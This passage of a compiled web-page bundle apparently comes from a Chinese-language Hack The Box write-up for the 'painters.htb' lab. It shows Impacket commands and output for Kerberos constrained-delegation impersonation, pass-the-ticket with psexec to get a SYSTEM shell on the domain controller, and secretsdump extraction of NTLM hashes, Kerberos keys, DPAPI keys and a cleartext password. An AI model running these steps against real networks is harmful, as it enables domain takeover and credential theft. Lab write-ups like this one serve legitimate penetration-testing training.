192.168.110.55 -spn CIFS/dc.painters.htb -impersonate Administrator  PAINTERS.HTB/blake:'NewPassword123!@#$'\n\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n/usr/local/bin/getST.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'getST.py')\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK\n[*] Impersonating Administrator\n[*] Requesting S4U2self\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK\n[*] Requesting S4U2Proxy\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:88  ...  OK\n[*] Saving ticket in Administrator@CIFS_dc.painters.htb@PAINTERS.HTB.ccache\n"})}),"\n",(0,s.jsx)(n.h3,{id:"ptt\u767b\u9646",children:"PTT\u767b\u9646"}),"\n",(0,s.jsx)(n.p,{children:"\u7ec8\u7aef\u52a0\u8f7d"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# export KRB5CCNAME=Administrator@CIFS_dc.painters.htb@PAINTERS.HTB.ccache\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# proxychains psexec.py PAINTERS.HTB/Administrator@dc.painters.htb -k -no-pass  -dc-ip 192.168.110.55\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'psexec.py')\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK\n[*] Requesting shares on dc.painters.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file QZOsesPo.exe\n[*] Opening SVCManager on dc.painters.htb.....\n[*] Creating service gIWO on dc.painters.htb.....\n[*] Starting service gIWO.....\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445 [!] Press help for extra shell commands\n ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK\nMicrosoft Windows [Version 10.0.20348.2113]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami                       \nnt authority\\system\n\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u62d6\u53d6hash-1",children:"\u62d6\u53d6hash"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# proxychains secretsdump.py PAINTERS.HTB/Administrator@dc.painters.htb -k -no-pass  -dc-ip 192.168.110.55\n\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'secretsdump.py')\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:445  ...  OK\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0x26e642aeb927768190bf01f71ffcc079\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \nPAINTERS\\DC$:plain_password_hex:f1e223bb02500686631057a53dbbbff423ebc5664b1cd267bd081b768d2cbcb9938882e143b530ba28156026d9903257f2ced1173a6795809e3e3d36bda4c236804cab3bb70eecaadd196afe757493262552fb6e38646fc87845d5ac55b55e50ffd399e1ed6cec8bb8efc7144904701586b9f3c93011be4d1c466e5b90585ac8175ef10d2b27ae87b7c763b0e3425325b43140c634e2faa952ae80163e4b296d13bcf0446c75907775a72820caf741a7d35e978cbdbc6daa559b5513783ba258b7604263686767bbb263df03e758aa8806122808a157172684d80547c0945c1dcfb348e0d5a54d2d1334da4f8075898f\nPAINTERS\\DC$:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0xfecd1b4601f1f1becf33b389ffa2eff5d8bc8cd3\ndpapi_userkey:0x6130d2e50c7b21539230412422edeb0071253077\n[*] NL$KM \n 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W\n 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..\n 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%\n 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.\nNL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:135  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:49667  ...  OK\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:b59ffc1f7fcd615577dab8436d3988fc:::\nriley:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::\nblake:1107:aad3b435b51404eeaad3b435b51404ee:1a1ecf1f217235e278073199dffa9f4c:::\ngavin:1108:aad3b435b51404eeaad3b435b51404ee:cb8ec920398da9fbb7c33b7b613b28d5:::\ndaniel:1109:aad3b435b51404eeaad3b435b51404ee:b084c663ad3f214e516e6f89c81c80d7:::\ntom:1110:aad3b435b51404eeaad3b435b51404ee:dc51a409ab6cf835cbb9e471f27d8bc6:::\nweb_svc:1111:aad3b435b51404eeaad3b435b51404ee:502472f625746727fa99566032383067:::\npainters.htb\\Matt:4101:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::\nDC$:1000:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::\nPNT-SVRSVC$:1103:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::\nPNT-SVRBPA$:1104:aad3b435b51404eeaad3b435b51404ee:2dfcebbe9f5f4cb3bf98032887b3d7b6:::\nPNT-SVRPSB$:1105:aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a:::\nMAINTENANCE$:2101:aad3b435b51404eeaad3b435b51404ee:6db918e3d0a23093360a17711ac9c59a:::\nWORKSTATION-1$:2103:aad3b435b51404eeaad3b435b51404ee:9ab46ef513f6f74ddf1ab492b8f542fa:::\nZSM$:2102:aad3b435b51404eeaad3b435b51404ee:68d23d52ad8d8005d7bf830856cd0600:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36\nAdministrator:aes128-cts-hmac-sha1-96:f6139559372a236bde1524329d2aa492\nAdministrator:des-cbc-md5:807c2a64b3c8b379\nkrbtgt:aes256-cts-hmac-sha1-96:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b\nkrbtgt:aes128-cts-hmac-sha1-96:9a6c9880f96f75edd17f648206fb5abd\nkrbtgt:des-cbc-md5:25f2432654101f40\nriley:aes256-cts-hmac-sha1-96:2c9f84f81d7a76eb1f29193107fd2e51834962cc90cfcfafef7ab4baabe59360\nriley:aes128-cts-hmac-sha1-96:bc65c97f9324894006a5e389ab91ccec\nriley:des-cbc-md5:3e018f85012cc8b0\nblake:aes256-cts-hmac-sha1-96:cb055f6c51a9a274e38a297ebc0af1532d6886bb4a37f36a04bc88ff813dc85e\nblake:aes128-cts-hmac-sha1-96:5c2a770eccd65e140e653be34a72ab90\nblake:des-cbc-md5:c86e3146fbdfc29e\ngavin:aes256-cts-hmac-sha1-96:fa583a1938a32986a2c23f7787aa2c3282b96259c89070a01a19e256b58f9992\ngavin:aes128-cts-hmac-sha1-96:fbcae12c4967569b398868fb38f0b300\ngavin:des-cbc-md5:b54f67f19d8ab367\ndaniel:aes256-cts-hmac-sha1-96:8bb18fd1df9c7eecfa5c4de65ca4fda6c37efc98a2c94ef8edf8a4e606bc6ffd\ndaniel:aes128-cts-hmac-sha1-96:ba81e1c1fb60c279aa5c685ede732c8e\ndaniel:des-cbc-md5:a7455b207f1570ad\ntom:aes256-cts-hmac-sha1-96:657f8676662fc4f5ad5bca4c19f1576ff1ce200fa5418860a5483f99d0d05888\ntom:aes128-cts-hmac-sha1-96:b1c6797bf5e899d09cf865d30470bb7c\ntom:des-cbc-md5:2aea89cb23b6f246\nweb_svc:aes256-cts-hmac-sha1-96:bc2600db46b90a0deffc6a34f60f9574b82ede49e71d4cf337f11ddf290993d8\nweb_svc:aes128-cts-hmac-sha1-96:e9c960b6403d6aa5b6b79885e1cc11b0\nweb_svc:des-cbc-md5:e6b986ae31e34a20\npainters.htb\\Matt:aes256-cts-hmac-sha1-96:42656beb2852a473c35498f55fbe113d4d722bb2efb36b1689d9b1a60e9cfa03\npainters.htb\\Matt:aes128-cts-hmac-sha1-96:a79e61bd0ca1d5760d5178e6010af2f7\npainters.htb\\Matt:des-cbc-md5:624c3458945b4675\nDC$:aes256-cts-hmac-sha1-96:3ed6c9f397b46b39a4099ef6ffb834168f1b7abedde82561cee74d3f2cfb1f73\nDC$:aes128-cts-hmac-sha1-96:c26f7ec4b891b19151704ac3a45ae0fe\nDC$:des-cbc-md5:5e3b4cb002b3f289\nPNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a\nPNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4\nPNT-SVRSVC$:des-cbc-md5:0db9624308c7c76b\nPNT-SVRBPA$:aes256-cts-hmac-sha1-96:09f22fb6cd45a7a633854dcb861371f7af81676d336121d383c35328c127bee4\nPNT-SVRBPA$:aes128-cts-hmac-sha1-96:a064d5c19ffd7dc845c31cbc9bbcc85d\nPNT-SVRBPA$:des-cbc-md5:cdec8ff8e9041cb0\nPNT-SVRPSB$:aes256-cts-hmac-sha1-96:543458b7a3d85c5f48438b5096ba4653e73ca7291b797691ee96368255ffbab6\nPNT-SVRPSB$:aes128-cts-hmac-sha1-96:5db252e5f61efa9b6cfa4404ccc975e7\nPNT-SVRPSB$:des-cbc-md5:29f78975e5f20b7f\nMAINTENANCE$:aes256-cts-hmac-sha1-96:31846c6b8b5f7a6116d7e2e7a7f3d4b4f4eda46f6dda8e3170a340f387bdb56c\nMAINTENANCE$:aes128-cts-hmac-sha1-96:ccb136a8d9d5eed3308a6c4a9a31fc8c\nMAINTENANCE$:des-cbc-md5:eaadcb1fc4b0d334\nWORKSTATION-1$:aes256-cts-hmac-sha1-96:f65b04cc76d8dc57579d12a0b29b294f6fc25c947fbf7e5dde6c3639330f73c0\nWORKSTATION-1$:aes128-cts-hmac-sha1-96:729c49ae39c12a40da4ffb2267366f87\nWORKSTATION-1$:des-cbc-md5:f4e00e6bcbe35e62\nZSM$:aes256-cts-hmac-sha1-96:f1c72a419a284370fe91423e3589377673668234ac007f3895e35f59fd238bf5\nZSM$:aes128-cts-hmac-sha1-96:9222b905052239287d02e107f1fd467c\nZSM$:des-cbc-md5:c7e6f89e102a5df1\n[*] ClearText passwords grabbed\npainters.htb\\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!\n[*] Cleaning up... \n[*] Stopping service RemoteRegistry\n[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.\n[*] Cleaning up... \n"})})]})}function p(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(b,{...e})}):b(e)}},4061:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/892ca35c0c7e15202d018de3551cb2a5-e7bc6237b938e94be8844f78cb290c64.png"},5823:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/dcd974d1753777a23a684d4dcedd47d4-6ebb23e3fe637a34a37334ec20c7683c.png"},9476:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/image-1-c95550b25244d3adbafe115973cc1d5b.png"},2990:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/image-f3796549abbe705e40881a44fdc28841.png"},8453:(e,n,a)=>{a.d(n,{R:()=>o,x:()=>i});var s=a(6540);const c={},d=s.createContext(c);function o(e){const n=s.useContext(d);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:o(e.components),s.createElement(d.Provider,{value:n},e.children)}}}]);